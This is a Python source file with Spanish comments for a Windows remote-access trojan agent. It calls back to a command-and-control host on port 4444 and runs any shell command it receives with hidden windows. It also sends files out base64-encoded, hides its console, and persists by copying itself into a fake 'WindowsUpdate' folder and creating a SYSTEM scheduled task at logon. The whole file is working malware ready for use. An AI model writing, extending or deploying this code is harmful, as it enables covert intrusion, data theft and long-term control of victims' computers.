
import sys
import os
import socket
import struct
import json
import base64
import time
import random
import hashlib
import subprocess
import ctypes
import threading
import winreg
import tempfile
import shutil
from datetime import datetime

# ============================================
# CONFIGURACIÓN
# ============================================
C2_IP = "192.168.254.137"  # TU IP KALI
C2_PORT = 4444
RECONNECT_DELAY = 5

# ============================================
# UTILIDADES BÁSICAS
# ============================================

def hide_console():
    """Ocultar consola solo si está compilado"""
    if hasattr(sys, 'frozen'):
        try:
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0
            )
        except:
            pass

def get_system_id():
    """Generar ID único del sistema"""
    try:
        hostname = socket.gethostname()
        username = os.getenv('USERNAME', 'Unknown')
        return hashlib.md5(f"{hostname}{username}".encode()).hexdigest()[:8]
    except:
        return hashlib.md5(str(random.random()).encode()).hexdigest()[:8]

# ============================================
# PROTOCOLO SIMPLE (FUNCIONAL)
# ============================================

class SimpleProtocol:
    @staticmethod
    def send(sock, data):
        """Enviar datos simple"""
        if isinstance(data, str):
            data = data.encode('utf-8', errors='ignore')
        
        # Enviar longitud (4 bytes) + datos
        length = len(data)
        sock.sendall(struct.pack('>I', length) + data)
    
    @staticmethod
    def receive(sock, timeout=30):
        """Recibir datos simple"""
        original_timeout = sock.gettimeout()
        sock.settimeout(timeout)
        
        try:
            # Recibir longitud
            length_data = sock.recv(4)
            if not length_data or len(length_data) != 4:
                return None
            
            length = struct.unpack('>I', length_data)[0]
            
            # Recibir datos
            data = b''
            while len(data) < length:
                try:
                    chunk = sock.recv(min(4096, length - len(data)))
                    if not chunk:
                        return None
                    data += chunk
                except socket.timeout:
                    continue
            
            return data.decode('utf-8', errors='ignore')
            
        except socket.timeout:
            return None
        except:
            return None
        finally:
            sock.settimeout(original_timeout)

# ============================================
# EJECUTOR DE COMANDOS SIMPLE
# ============================================

class SimpleExecutor:
    @staticmethod
    def execute(cmd):
        """Ejecutar comando de forma simple"""
        try:
            # Comandos especiales
            cmd_lower = cmd.strip().lower()
            
            if cmd_lower == 'sysinfo':
                return SimpleExecutor._get_system_info()
            
            elif cmd_lower.startswith('download '):
                filepath = cmd[9:].strip()
                return SimpleExecutor._download_file(filepath)
            
            # Comando normal
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            
            # Usar cmd por defecto
            process = subprocess.run(
                ['cmd.exe', '/c', cmd],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW,
                timeout=30,
                text=True,
                errors='ignore'
            )
            
            output = f"Exit Code: {process.returncode}\n"
            if process.stdout:
                output += f"Output:\n{process.stdout}\n"
            if process.stderr:
                output += f"Errors:\n{process.stderr}"
            
            return output if output.strip() else "Command executed (no output)"
            
        except subprocess.TimeoutExpired:
            return "ERROR: Timeout (30 seconds)"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    @staticmethod
    def _get_system_info():
        """Obtener información básica del sistema"""
        info = []
        info.append(f"Hostname: {socket.gethostname()}")
        info.append(f"User: {os.getenv('USERNAME', 'Unknown')}")
        info.append(f"OS: Windows")
        info.append(f"Arch: {sys.platform}")
        info.append(f"Python: {sys.version.split()[0]}")
        return "\n".join(info)
    
    @staticmethod
    def _download_file(filepath):
        """Descargar archivo"""
        try:
            if not os.path.exists(filepath):
                return f"ERROR: File not found: {filepath}"
            
            with open(filepath, 'rb') as f:
                content = f.read()
            
            encoded = base64.b64encode(content).decode('ascii')
            return f"FILE:{os.path.basename(filepath)}:{encoded}"
        except Exception as e:
            return f"ERROR: {str(e)}"

# ============================================
# AGENTE PRINCIPAL SIMPLE
# ============================================

class SimpleAgent:
    def __init__(self):
        self.agent_id = get_system_id()
        self.running = True
        self.protocol = SimpleProtocol()
    
    def connect(self):
        """Conexión principal"""
        while self.running:
            try:
                print(f"[*] Connecting to {C2_IP}:{C2_PORT}...")
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((C2_IP, C2_PORT))
                
                print("[+] Connected!")
                
                # Enviar handshake
                agent_info = {
                    'type': 'agent',
                    'id': self.agent_id,
                    'hostname': socket.gethostname(),
                    'user': os.getenv('USERNAME', 'Unknown'),
                    'time': datetime.now().isoformat()
                }
                
                self.protocol.send(sock, json.dumps(agent_info))
                print("[+] Handshake sent")
                
                # Loop de comandos
                self.command_loop(sock)
                
                sock.close()
                print("[-] Connection closed")
                
            except ConnectionRefusedError:
                print(f"[-] Connection refused. Retry in {RECONNECT_DELAY}s...")
            except socket.timeout:
                print(f"[-] Timeout. Retry in {RECONNECT_DELAY}s...")
            except Exception as e:
                print(f"[-] Error: {e}")
            
            if self.running:
                time.sleep(RECONNECT_DELAY)
    
    def command_loop(self, sock):
        """Loop de comandos"""
        while self.running:
            try:
                # Recibir comando
                data = self.protocol.receive(sock, timeout=60)
                if data is None:
                    break
                
                print(f"[+] Received: {data[:50]}...")
                
                try:
                    # Intentar parsear como JSON
                    cmd_data = json.loads(data)
                    if cmd_data.get('type') == 'command':
                        command = cmd_data.get('command', '')
                        result = SimpleExecutor.execute(command)
                        
                        response = {
                            'type': 'result',
                            'id': self.agent_id,
                            'command': command,
                            'result': result
                        }
                        
                        self.protocol.send(sock, json.dumps(response))
                        print("[+] Response sent")
                    
                    elif cmd_data.get('type') == 'exit':
                        print("[+] Exit command received")
                        return
                        
                except json.JSONDecodeError:
                    # Comando directo
                    result = SimpleExecutor.execute(data)
                    self.protocol.send(sock, result)
                
            except socket.timeout:
                # Keep alive
                self.protocol.send(sock, json.dumps({'type': 'alive', 'id': self.agent_id}))
            except Exception as e:
                print(f"[-] Command error: {e}")
                break

# ============================================
# PERSISTENCIA SIMPLE
# ============================================

def install_persistence():
    """Instalar persistencia simple"""
    try:
        # Obtener ruta actual
        if hasattr(sys, 'frozen'):
            current_path = sys.executable
        else:
            current_path = os.path.abspath(sys.argv[0])
        
        # Crear directorio oculto
        install_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'UpdateCache')
        os.makedirs(install_dir, exist_ok=True)
        
        install_path = os.path.join(install_dir, 'WindowsUpdate.exe')
        
        if current_path != install_path:
            shutil.copy2(current_path, install_path)
            print(f"[+] Installed to: {install_path}")
        
        # Tarea programada simple
        task_name = "WindowsUpdateTask"
        task_cmd = f'schtasks /create /tn "{task_name}" /tr "{install_path}" /sc onlogon /ru SYSTEM /f'
        
        result = subprocess.run(task_cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print("[+] Scheduled task created")
        else:
            print(f"[-] Task creation failed: {result.stderr}")
        
        return install_path
        
    except Exception as e:
        print(f"[-] Installation error: {e}")
        return None

# ============================================
# FUNCIÓN PRINCIPAL
# ============================================

def main():
    """Función principal"""
    print("=" * 60)
    print("WINDOWS AGENT v1.0 - SIMPLE VERSION")
    print("=" * 60)
    
    # Ocultar consola si está compilado
    hide_console()
    
    # Instalar persistencia (opcional)
    if '--no-install' not in sys.argv:
        print("[*] Installing persistence...")
        install_persistence()
    
    # Iniciar agente
    agent = SimpleAgent()
    agent.connect()

# ============================================
# MANEJO DE ERRORES
# ============================================

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Agent stopped by user")
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        if '--debug' in sys.argv:
            import traceback
            traceback.print_exc()
        
        # Pausar si no está compilado
        if not hasattr(sys, 'frozen'):
            input("\nPress Enter to exit...")
